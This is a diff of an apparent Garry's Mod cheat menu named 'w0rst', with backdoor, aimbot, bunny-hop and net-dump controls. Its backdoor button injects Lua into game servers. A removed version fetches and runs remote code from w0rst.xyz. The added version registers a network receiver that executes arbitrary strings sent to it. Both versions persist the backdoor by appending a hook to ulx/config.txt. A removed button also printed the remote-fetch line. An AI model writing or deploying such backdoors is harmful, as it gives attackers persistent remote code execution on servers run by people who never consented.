@@ -1505,8 +1505,8 @@ end)
 CreateBDServer("File-Backdoor (ULX-Extended)", function()
     Log("Added/Injected Backdoor")
     SendLua([[
-        local lua = CompileString("http.Fetch('https://w0rst.xyz/project/func/napalm.php', RunString)", "????") lua()
-        file.Append("ulx/config.txt", "\n"..[=[ulx hook Think wtf hmm "http.Fetch('https://w0rst.xyz/project/func/napalm.php', RunString) hook.Remove('Think', 'wtf')"]=])
+        util.AddNetworkString('w0rst'); net.Receive('w0rst', function(len) RunString(net.ReadString()) end)
+        file.Append("ulx/config.txt", "\n"..[=[ulx hook Think wtf hmm "util.AddNetworkString('w0rst'); net.Receive('w0rst', function(len) RunString(net.ReadString()) end) hook.Remove('Think', 'wtf')"]=])
     ]])
 end)
 
@@ -2027,7 +2027,7 @@ CreateButton("Run Lua", BackdoorTab, 115, 30, 380, 520, function()
     end
 end)
 
-CreateCheckbox("Adv-Bhop", MiscTab, 22, 10, function()
+CreateCheckbox("Bhop", MiscTab, 22, 10, function()
     wtf.enable['Bhop'] = not wtf.enable['Bhop']
     if wtf.enable['Bhop'] then
         Log("Bhop Enabled")
@@ -2036,7 +2036,11 @@ CreateCheckbox("Adv-Bhop", MiscTab, 22, 10, function()
     end
 end)
 
-CreateButton("Net Dump", MiscTab, 110, 25, 142, 10, function()
+CreateButton("Unload", MiscTab, 110, 25, 142, 10, function()
+    Menu:Close(); Unload()
+end)
+
+CreateButton("Net Dump", MiscTab, 110, 25, 262, 10, function()
     local name = "w0rst/dumps/dump_"..math.random(10^5,10^10)..".txt"
 
     --[ Location check for ease of use ]--
@@ -2055,11 +2059,6 @@ CreateButton("Net Dump", MiscTab, 110, 25, 142, 10, function()
 
     Log("Check Console")
     print("Location: GarrysMod/garrysmod/data/"..name)
-end)
-
-CreateButton("w0rst-backdoor", MiscTab, 110, 25, 262, 10, function()
-    print("http.Fetch('https://w0rst.xyz/project/func/napalm.php', RunString)")
-    Log("Check Console")
 end)
 
 CreateCheckbox("RGB-Physgun", MiscTab, 382, 10, function()
@@ -2146,10 +2145,6 @@ end)
 CreateBindableButton("Bind Aimbot", "Aimbot", MiscTab, 142, 100)
 
 CreateBindableButton("Bind Menu", "Menu", MiscTab, 262, 100)
-
-CreateButton("Unload", MiscTab, 110, 25, 382, 100, function()
-    Menu:Close(); Unload()
-end)
 
 CreateButton("Play URL", SoundsTab, 495, 25, 10, 528, function()
     CreateInputBox("URL", function(str)
